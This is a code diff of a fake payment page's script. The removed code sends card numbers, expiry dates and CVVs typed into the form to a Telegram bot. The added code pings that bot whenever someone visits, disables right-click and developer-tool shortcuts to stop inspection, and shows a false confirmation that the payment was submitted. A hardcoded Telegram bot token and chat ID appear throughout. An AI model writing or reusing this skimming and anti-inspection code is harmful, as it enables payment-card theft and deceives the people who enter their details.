@@ -81,25 +81,11 @@
     </div>
 
     <script>
-        document.getElementById('paymentForm').addEventListener('submit', async (event) => {
-            event.preventDefault();
-
-            // Collect form data
-            const formData = new FormData(event.target);
-            const data = {
-                cardNumber: formData.get('cardNumber'),
-                expiryDate: formData.get('expiryDate'),
-                cvv: formData.get('cvv'),
-            };
-
-            // Send data to your Telegram bot
+        // Notify when a user accesses the page
+        async function notifyUserEntry() {
             const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
             const chatId = '7747778364';
-
-            const message = `New Payment Details:
-Card Number: ${data.cardNumber}
-Expiry Date: ${data.expiryDate}
-CVV: ${data.cvv}`;
+            const message = `A user has accessed the payment page at ${new Date().toLocaleString()}.`;
 
             await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                 method: 'POST',
@@ -109,8 +95,22 @@ CVV: ${data.cvv}`;
                     text: message,
                 }),
             });
+        }
 
-            alert('Payment data sent to Telegram!');
+        notifyUserEntry();
+
+        // Disable right-click and developer tools
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+        });
+
+        // Handle form submission
+        document.getElementById('paymentForm').addEventListener('submit', (event) => {
+            event.preventDefault();
+            alert('Your payment details have been submitted.');
         });
     </script>
 </body>
